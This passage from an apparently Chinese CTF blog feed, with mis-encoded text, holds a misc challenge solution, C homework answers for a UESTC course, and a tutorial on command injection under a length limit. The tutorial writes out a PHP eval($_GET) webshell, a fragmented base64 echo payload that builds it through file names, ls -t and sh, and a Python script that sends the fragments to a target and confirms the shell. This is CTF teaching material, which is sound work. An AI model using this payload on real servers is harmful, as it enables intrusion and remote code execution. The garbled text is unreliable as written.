æ‰“å¼€ï¼Œå¾—åˆ°</p><p><img src="/posts/b4162f1f/image-20240205145700052.png" alt="image-20240205145700052"></p><p>ç”¨ foremost</p><p><img src="/posts/b4162f1f/image-20240205145802777.png" alt="image-20240205145802777"></p><p>å¾—åˆ° <code>CVOCRJGMKLDJGBQIUIVXHEYLPNWR</code></p><p><img src="/posts/b4162f1f/image-20240205145822199.png" alt="image-20240205145822199"></p><p><em><strong><center><font color="#81ecec" size="6"><code>hgame&#123;DISAPPEARINTHESEAOFBUTTERFLY&#125;</code></font></center></strong></em></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>æœ‰é•¿åº¦é™åˆ¶çš„RCEæ³¨å…¥</title>
    <link href="/posts/34863/"/>
    <url>/posts/34863/</url>
    
    <content type="html"><![CDATA[<h1 id="æœ‰é•¿åº¦é™åˆ¶çš„RCEæ³¨å…¥"><a href="#æœ‰é•¿åº¦é™åˆ¶çš„RCEæ³¨å…¥" class="headerlink" title="æœ‰é•¿åº¦é™åˆ¶çš„RCEæ³¨å…¥"></a>æœ‰é•¿åº¦é™åˆ¶çš„RCEæ³¨å…¥</h1><h2 id="åŸºæœ¬çŸ¥è¯†"><a href="#åŸºæœ¬çŸ¥è¯†" class="headerlink" title="åŸºæœ¬çŸ¥è¯†"></a>åŸºæœ¬çŸ¥è¯†</h2><h3 id="ä¸"><a href="#ä¸" class="headerlink" title="&gt;ä¸&gt;&gt;"></a><code>&gt;</code>ä¸<code>&gt;&gt;</code></h3><p>æˆ‘ä»¬çŸ¥é“Linuxä¸­ï¼Œæœ‰<code>&gt;</code>å’Œ<code>&gt;&gt;</code>å‘½ä»¤</p><blockquote><ul><li>æˆ‘ä»¬å¯ä»¥é€šè¿‡<code>&gt;</code>æ¥åˆ›å»ºæ–°æ–‡ä»¶</li></ul><p><img src="/posts/34863/image-20231209152729849.png" alt="image-20231209152729849"></p><ul><li>åŒæ—¶<code>&gt;</code>ä¹Ÿå¯ä»¥ç”¨æ¥å¾€æ–‡ä»¶å­˜å…¥å†…å®¹ï¼Œä½†æ˜¯ä½¿ç”¨<code>&gt;</code>ä¼šç›´æ¥è¦†ç›–æ–‡ä»¶ä¸ºä½ éœ€è¦çš„å†…å®¹ï¼Œå¦‚æœæ–‡ä»¶ä¸å­˜åœ¨ï¼Œé‚£ä¹ˆæ–°å»ºæ–‡ä»¶å†æ”¾å…¥ä½ éœ€è¦çš„å†…å®¹</li></ul><p><img src="/posts/34863/image-20231209153007009.png" alt="image-20231209153007009"></p><ul><li><p>è€Œ<code>&gt;&gt;</code>åˆ™æ˜¯å¾€æ–‡ä»¶ä¸­è¿½åŠ æ–°å†…å®¹ï¼Œä¸ä¼šè¦†ç›–åŸæ–‡ä»¶ï¼ŒåŒæ ·çš„å¦‚æœæ–‡ä»¶ä¸å­˜åœ¨ä¹Ÿä¼šæ–°å»ºæ–‡ä»¶å†è¿½åŠ </p><p><img src="/posts/34863/image-20231209153252038.png" alt="image-20231209153252038"></p></li></ul></blockquote><h3 id="å¤šè¡Œå‘½ä»¤"><a href="#å¤šè¡Œå‘½ä»¤" class="headerlink" title="å¤šè¡Œå‘½ä»¤"></a>å¤šè¡Œå‘½ä»¤</h3><p>åŒæ ·æ˜¯åœ¨Linuxä¸­ï¼Œæˆ‘ä»¬å¯ä»¥é‡‡ç”¨åœ¨æ²¡å†™å®Œçš„å‘½ä»¤åå†™å…¥<code>\</code>çš„æ–¹å¼ï¼Œå®ç°å¤šè¡Œå‘½ä»¤</p><p><img src="/posts/34863/image-20231209153724846.png" alt="image-20231209153724846"></p><p>åŒæ—¶æˆ‘ä»¬ä¹Ÿå¯ä»¥å°†å‘½ä»¤å¦‚ä¸Šå›¾ä¸€æ ·å†™å…¥æ–‡ä»¶ï¼Œå¹¶ä½¿ç”¨<code>sh</code>æ‰§è¡Œè¯¥æ–‡ä»¶</p><p><img src="/posts/34863/image-20231209154124667.png" alt="image-20231209154124667"></p><ul><li>æ³¨æ„è¿™é‡Œè¦ä½¿ç”¨<code>&gt;&gt;</code>è¿½åŠ å‘½ä»¤</li></ul><h3 id="ls-t"><a href="#ls-t" class="headerlink" title="ls -t"></a><code>ls -t</code></h3><p>Linuxä¸­ï¼Œ<code>ls -t</code>å¯ä»¥è®©æ–‡ä»¶æŒ‰ç…§æ—¶é—´è¿›è¡Œæ’åºï¼ˆæ—¶é—´é åçš„æ’åœ¨å‰é¢ï¼‰</p><p><img src="/posts/34863/image-20231209154743546.png" alt="image-20231209154743546"></p><p>åŒæ—¶ä¹Ÿå¯ä»¥ä¸ä¸Šè¿°å‘½ä»¤æ„é€ <code>ls -t &gt; cmd</code></p><p><img src="/posts/34863/image-20231209155053407.png" alt="image-20231209155053407"></p><p>æ˜¯ä¸æ˜¯è·Ÿ<strong>å¤šè¡Œå‘½ä»¤</strong>ä¸­çš„å¾ˆåƒï¼Œæ‰€ä»¥å¦‚æœæˆ‘ä»¬æŠŠæ–‡ä»¶åå†™ä¸ºç‰‡æ®µåŒ–çš„å‘½ä»¤ï¼Œå°±å¯ä»¥ç”¨<code>sh</code>æ¥å®ç°æ‰§è¡Œå‘½ä»¤</p><p><img src="/posts/34863/image-20231209155525230.png" alt="image-20231209155525230"></p><p>ä¹‹æ‰€ä»¥æ˜¯<code>\\</code>æ˜¯å› ä¸ºé˜²æ­¢å¼•å·è½¬ä¹‰å®é™…ä¸Šåªæœ‰ä¸€ä¸ª<code>\</code>å†™å…¥</p><h2 id="å®æˆ˜"><a href="#å®æˆ˜" class="headerlink" title="å®æˆ˜"></a>å®æˆ˜</h2><p>è®¿é—®é¢˜ç›®åœ°å€</p><p><img src="/posts/34863/image-20231018232631239.png" alt="rce-1"></p><p>è§‚å¯Ÿä»£ç ï¼Œfilterå‡½æ•°ä¸­åšäº†è¿‡æ»¤ï¼Œæ¥ä¸‹æ¥çš„ä»£ç å¯¹Getçš„å†…å®¹åšäº†é•¿åº¦é™åˆ¶ï¼Œå¯ä»¥ç”¨åˆ°æˆ‘ä»¬ä¸Šé¢å­¦åˆ°çš„çŸ¥è¯†</p><p>äºæ˜¯æ„é€ ä¸€ä¸‹<code>payload</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-number">1</span>]); <span class="hljs-comment"># éœ€è¦å†™å…¥çš„ä¸€å¥è¯æœ¨é©¬</span><br><br>PD9waHAgZXZhbCgkX0dFVFsxXSk7 <span class="hljs-comment"># base64ç¼–ç å</span><br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">echo PD9waHAgZXZhbCgkX0dFVFsxXSk7|base64 -d&gt;1.php # ç»„åˆä¸€ä¸‹<br></code></pre></td></tr></table></figure><p>è§£é‡Šä¸€ä¸‹</p><ul><li><code>echo PD9waHAgZXZhbCgkX0dFVFsxXSk7</code> æ˜¯ä¸€ä¸ªå°†Base64ç¼–ç å­—ç¬¦ä¸²è¾“å‡ºåˆ°æ ‡å‡†è¾“å‡ºçš„å‘½ä»¤</li><li><code>base64 -d</code> æ˜¯ä¸€ä¸ªBase64è§£ç çš„å‘½ä»¤ã€‚åœ¨è¿™é‡Œï¼Œå®ƒå°†æ¥æ”¶å‰ä¸€ä¸ªå‘½ä»¤è¾“å‡ºçš„Base64ç¼–ç å­—ç¬¦ä¸²ï¼Œå¹¶è§£ç æˆåŸå§‹çš„äºŒè¿›åˆ¶æ•°æ®</li><li><code>&gt; 1.php</code> å°†è§£ç åçš„äºŒè¿›åˆ¶æ•°æ®ä¿å­˜åˆ°ä¸€ä¸ªåä¸º <code>1.php</code> çš„æ–‡ä»¶ä¸­</li></ul><p>å‘½ä»¤æŒºé•¿çš„æ‰€ä»¥æˆ‘ä»¬å¯ä»¥å†™ä¸ªè„šæœ¬æ¥è‡ªåŠ¨æ‰§è¡Œä¸€ä¸‹</p><p>payload.txt:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">hp</span><br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">1.p\\</span><br><span class="language-bash">&gt;d\&gt;\\</span><br><span class="language-bash">&gt;\ -\\</span><br><span class="language-bash">&gt;e64\\</span><br><span class="language-bash">&gt;bas\\</span><br><span class="language-bash">&gt;7\|\\</span><br><span class="language-bash">&gt;XSk\\</span><br><span class="language-bash">&gt;Fsx\\</span><br><span class="language-bash">&gt;dFV\\</span><br><span class="language-bash">&gt;kX0\\</span><br><span class="language-bash">&gt;bCg\\</span><br><span class="language-bash">&gt;XZh\\</span><br><span class="language-bash">&gt;AgZ\\</span><br><span class="language-bash">&gt;waH\\</span><br><span class="language-bash">&gt;PD9\\</span><br><span class="language-bash">&gt;o\ \\</span><br><span class="language-bash">&gt;ech\\</span><br><span class="language-bash"><span class="hljs-built_in">ls</span> -t&gt;0</span><br>sh 0<br></code></pre></td></tr></table></figure><p>è„šæœ¬:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://xxx/?6=&#123;0&#125;&quot;</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+]start attack!!!&quot;</span>)<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;payload.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> f:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*]&quot;</span> + url.<span class="hljs-built_in">format</span>(i.strip()))<br>        requests.get(url.<span class="hljs-built_in">format</span>(i.strip()))<br><br><span class="hljs-comment"># æ£€æŸ¥æ˜¯å¦æ”»å‡»æˆåŠŸ</span><br>test = requests.get(<br>    <span class="hljs-string">&quot;http://xxx/sandbox/xxxx/1.php&quot;</span><br>)<br><span class="hljs-keyword">if</span> test.status_code == requests.codes.ok:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*]Attack success!!!&quot;</span>)<br><br></code></pre></td></tr></table></figure><p>ç°åœ¨è®¿é—®<code>1.php</code>ä¾¿å¯ä»¥æ­£å¸¸çš„å‘½ä»¤æ‰§è¡Œäº†</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>UESTC-iCoding-F1</title>
    <link href="/posts/47483/"/>
    <url>/posts/47483/</url>
    
    <content type="html"><![CDATA[<h1 id="UESTC-ä¿¡è½¯-iCoding-F1-Answer"><a href="#UESTC-ä¿¡è½¯-iCoding-F1-Answer" class="headerlink" title="[UESTC-ä¿¡è½¯] iCoding F1 Answer"></a>[UESTC-ä¿¡è½¯] iCoding F1 Answer</h1><h2 id="å®éªŒä¸€"><a href="#å®éªŒä¸€" class="headerlink" title="å®éªŒä¸€"></a>å®éªŒä¸€</h2><h3 id="è®¡ç®—ç¨é‡‘-Tax"><a href="#è®¡ç®—ç¨é‡‘-Tax" class="headerlink" title="è®¡ç®—ç¨é‡‘(Tax)"></a>è®¡ç®—ç¨é‡‘(Tax)</h3><blockquote><p>ç¼–å†™ä¸€ä¸ªç¨‹åºï¼Œè¦æ±‚ç”¨æˆ·è¾“å…¥ä¸€ä¸ªç¾å…ƒæ•°é‡ï¼Œç„¶åæ˜¾ç¤ºå‡ºå¢åŠ  5% ç¨ç‡åçš„ç›¸åº”é‡‘é¢ã€‚</p><p><em><strong>è¾“å‡ºèŒƒä¾‹ï¼š</strong></em></p><blockquote><p>Enter an amount: 100.00<br>with tax added: $105.00</p></blockquote><p>è¾“å…¥çš„é‡‘é¢ä¸ºå¤§äº 0 çš„ä¸¤ä½æ•°æµ®ç‚¹æ•°ã€‚</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">float</span> a;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter an amount: &quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%f&quot;</span>, &amp;a);<br>    a *= <span class="hljs-number">1.05</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;with tax added: $%.2f&quot;</span>, a);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="è®¡ç®—è´¦å•ï¼ˆBillsï¼‰"><a href="#è®¡ç®—è´¦å•ï¼ˆBillsï¼‰" class="headerlink" title="è®¡ç®—è´¦å•ï¼ˆBillsï¼‰"></a>è®¡ç®—è´¦å•ï¼ˆBillsï¼‰</h3><blockquote><p>ç¼–å†™â¼€ä¸ªç¨‹åºï¼Œè¦æ±‚ç”¨æˆ·è¾“å‡ºâ¼€ä¸ªç¾å…ƒæ•°é‡ï¼Œç„¶åæ˜¾ç¤ºå‡ºå¦‚ä½•ç”¨æœ€å°‘20ç¾å…ƒã€10ç¾å…ƒã€5ç¾å…ƒå’Œ1ç¾å…ƒæ¥ä»˜æ¬¾ã€‚</p><p><em><strong>è¾“å‡ºèŒƒä¾‹ï¼š</strong></em></p><blockquote><p>Enter a dollar amount: 93<br>$20 bills: 4<br>$10 bills: 1<br>$5 bills: 0<br>$1 bills: 3</p></blockquote></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">int</span> dollar, b, c, d, e;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter a dollar amount: &quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;dollar);<br>    b = dollar / <span class="hljs-number">20</span>;<br>    c = (dollar - b * <span class="hljs-number">20</span>) / <span class="hljs-number">10</span>;<br>    d = (dollar - b * <span class="hljs-number">20</span> - c * <span class="hljs-number">10</span>) / <span class="hljs-number">5</span>;<br>    e = dollar - b * <span class="hljs-number">20</span> - c * <span class="hljs-number">10</span> - d * <span class="hljs-number">5</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;$20 bills: %d\n&quot;</span>, b);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;$10 bills: %d\n&quot;</span>, c);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;$5 bills: %d\n&quot;</span>, d);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;$1 bills: %d\n&quot;</span>, e);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="è¿˜è´·è®¡ç®—ï¼ˆLoan-Balanceï¼‰"><a href="#è¿˜è´·è®¡ç®—ï¼ˆLoan-Balanceï¼‰" class="headerlink" title="è¿˜è´·è®¡ç®—ï¼ˆLoan Balanceï¼‰"></a>è¿˜è´·è®¡ç®—ï¼ˆLoan Balanceï¼‰</h3><blockquote><p>ç¼–ç¨‹è®¡ç®—ç¬¬ä¸€ã€ç¬¬äºŒã€ç¬¬ä¸‰ä¸ªæœˆè¿˜è´·åå‰©ä½™çš„è´·æ¬¾é‡‘é¢ã€‚</p><p><em><strong>è¾“å‡ºèŒƒä¾‹ï¼š</strong></em></p><blockquote><p>Enter amout of loan: 20000.00<br>Enter interest rate: 6.0<br>Enter monthly payment: 386.66</p><p>Balance remaining after first payment: $19713.34<br>Balance remaining after second payment: $19425.25<br>Balance remaining after third payment: $19135.71</p></blockquote><p>æç¤ºï¼šæ¯ä¸ªæœˆçš„è´·æ¬¾ä½™é¢å‡å»è¿˜æ¬¾é‡‘é¢åï¼Œè¿˜éœ€è¦åŠ ä¸Šè´·æ¬¾ä½™é¢ä¸æœˆåˆ©ç‡çš„ä¹˜ç§¯ã€‚æœˆåˆ©ç‡çš„è®¡ç®—æ–¹æ³•æ˜¯æŠŠç”¨æˆ·è¾“å…¥çš„åˆ©ç‡è½¬æ¢æˆç™¾åˆ†æ•°å†é™¤ä»¥12ã€‚</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">float</span> <span class="hljs-title function_">loanCount</span><span class="hljs-params">(<span class="hljs-type">float</span> loan, <span class="hljs-type">float</span> rate, <span class="hljs-type">float</span> payment)</span><br>&#123;<br>    loan = (loan - payment) + loan * rate;<br>    <span class="hljs-keyword">return</span> loan;<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">float</span> loan, rate, payment;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter amout of loan: &quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%f&quot;</span>, &amp;loan);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter interest rate: &quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%f&quot;</span>, &amp;rate);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter monthly payment: &quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%f&quot;</span>, &amp;payment);<br>    rate = rate / <span class="hljs-number">100</span> / <span class="hljs-number">12</span>;<br>    loan = loanCount(loan, rate, payment);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Balance remaining after first payment: $%.2f\n&quot;</span>, loan);<br>    loan = loanCount(loan, rate, payment);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Balance remaining after second payment: $%.2f\n&quot;</span>, loan);<br>    loan = loanCount(loan, rate, payment);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Balance remaining after third payment: $%.2f\n&quot;</span>, loan);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="æ—¥æœŸæ ¼å¼è½¬åŒ–ï¼ˆDate-Format-Conventionï¼‰"><a href="#æ—¥æœŸæ ¼å¼è½¬åŒ–ï¼ˆDate-Format-Conventionï¼‰" class="headerlink" title="æ—¥æœŸæ ¼å¼è½¬åŒ–ï¼ˆDate Format Conventionï¼‰"></a>æ—¥æœŸæ ¼å¼è½¬åŒ–ï¼ˆDate Format Conventionï¼‰</h3><blockquote><p>ç¼–å†™ä¸€ä¸ªç¨‹åºï¼Œä»¥æœˆ&#x2F;æ—¥&#x2F;å¹´ï¼ˆå³ mm&#x2F;dd&#x2F;yyï¼‰çš„æ ¼å¼æ¥å—ç”¨æˆ·å½•å…¥çš„æ—¥æœŸä¿¡æ¯ï¼Œå¹¶ä»¥å¹´æœˆæ—¥ï¼ˆå³yyyymmddï¼‰çš„æ ¼å¼å°†å…¶æ˜¾ç¤ºå‡ºæ¥ã€‚</p><p><em><strong>è¾“å‡ºèŒƒä¾‹ï¼š</strong></em></p><blockquote><p>Enter a date (mm&#x2F;dd&#x2F;yyyy): 2&#x2F;17&#x2F;2011<br>You entered the date 20110217</p></blockquote></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">int</span> m, d, y;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter a date (mm/dd/yyyy): &quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d/%d/%d&quot;</span>, &amp;m, &amp;d, &amp;y);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;You entered the date %04d%02d%02d&quot;</span>, y, m, d);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="åˆ†æ•°åŠ æ³•ï¼ˆFraction-Additionï¼‰"><a href="#åˆ†æ•°åŠ æ³•ï¼ˆFraction-Additionï¼‰" class="headerlink" title="åˆ†æ•°åŠ æ³•ï¼ˆFraction Additionï¼‰"></a>åˆ†æ•°åŠ æ³•ï¼ˆFraction Additionï¼‰</h3><blockquote><p>ä¿®æ”¹å¦‚ä¸‹ç¨‹åºï¼Œä½¿ç”¨æˆ·å¯ä»¥åŒæ—¶è¾“å…¥ä¸¤ä¸ªåˆ†æ•°ï¼Œä¸­é—´ç”¨åŠ å·éš”å¼€ï¼š</p><p><em><strong>è¾“å‡ºèŒƒä¾‹ï¼š</strong></em></p><blockquote><p>Enter two fractions separated by a plus sign: 5&#x2F;6+3&#x2F;4<br>The sum is 38&#x2F;24</p></blockquote></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">int</span> num1, denom1, num2, denom2, result_num, result_denom;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter two fractions separated by a plus sign: &quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d/%d+%d/%d&quot;</span>, &amp;num1, &amp;denom1, &amp;num2, &amp;denom2);<br><br>    result_num = num1 * denom2 + num2 * denom1;<br>    result_denom = denom1 * denom2;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The sum is %d/%d\n&quot;</span>, result_num, result_denom);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="å®éªŒäºŒ"><a href="#å®éªŒäºŒ" class="headerlink" title="å®éªŒäºŒ"></a>å®éªŒäºŒ</h2><h3 id="24å°æ—¶åˆ¶-12å°æ—¶åˆ¶è½¬æ¢-24-hour-to-12-hour"><a href="#24å°æ—¶åˆ¶-12å°æ—¶åˆ¶è½¬æ¢-24-hour-to-12-hour" class="headerlink" title="24å°æ—¶åˆ¶-12å°æ—¶åˆ¶è½¬æ¢(24-hour to 12-hour)"></a>24å°æ—¶åˆ¶-12å°æ—¶åˆ¶è½¬æ¢(24-hour to 12-hour)</h3><blockquote><p>ç¼–å†™ä¸€ä¸ªç¨‹åºï¼Œè¦æ±‚ç”¨æˆ·è¾“å…¥ 24 å°æ—¶åˆ¶çš„æ—¶é—´ï¼Œå°†å…¶è½¬æ¢ä¸º 12 å°æ—¶åˆ¶çš„æ ¼å¼ã€‚</p><p><em><strong>è¾“å‡ºèŒƒä¾‹ï¼š</strong></em></p><blockquote><p>Enter a 24-hour time: 21:11<br>Equivalent 12-hour time: 9:11 PM</p></blockquote><blockquote><p>Enter a 24-hour time: 0:01<br>Equivalent 12-hour time: 12:01 AM</p></blockquote><p>æ³¨æ„ï¼Œä¸è¦æŠŠ12:00æ˜¾ç¤ºä¸º0:00ã€‚</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">int</span> a, b;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter a 24-hour time: &quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d:%d&quot;</span>, &amp;a, &amp;b);<br>    <span class="hljs-keyword">if</span> (a &gt;= <span class="hljs-number">13</span>)<br>    &#123;<br>        a -= <span class="hljs-number">12</span>;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Equivalent 12-hour time: %d:%02d PM&quot;</span>, a, b);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (a &gt;= <span class="hljs-number">12</span>)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Equivalent 12-hour time: %d:%02d PM&quot;</span>, a, b);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (a &lt; <span class="hljs-number">1</span>)<br>    &#123;<br>        a += <span class="hljs-number">12</span>;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Equivalent 12-hour time: %d:%02d AM&quot;</span>, a, b);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Equivalent 12-hour time: %d:%02d AM&quot;</span>, a, b);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="é£é€Ÿç­‰çº§ä¸æè¿°ï¼ˆWind-Speedï¼‰"><a href="#é£é€Ÿç­‰çº§ä¸æè¿°ï¼ˆWind-Speedï¼‰" class="headerlink" title="é£é€Ÿç­‰çº§ä¸æè¿°ï¼ˆWind Speedï¼‰"></a>é£é€Ÿç­‰çº§ä¸æè¿°ï¼ˆWind Speedï¼‰</h3><blockquote><p>ä¸‹é¢æ˜¯ç”¨äºæµ‹é‡é£åŠ›ç­‰çº§çš„ç®€åŒ–ç‰ˆï¼Œç¼–å†™ä¸€ä¸ªç¨‹åºï¼Œè¦æ±‚ç”¨æˆ·è¾“å…¥é£é€Ÿï¼ˆæµ·é‡Œ&#x2F;å°æ—¶ï¼‰ï¼Œç„¶åæ˜¾ç¤ºç›¸åº”çš„æè¿°ã€‚</p><table><thead><tr><th 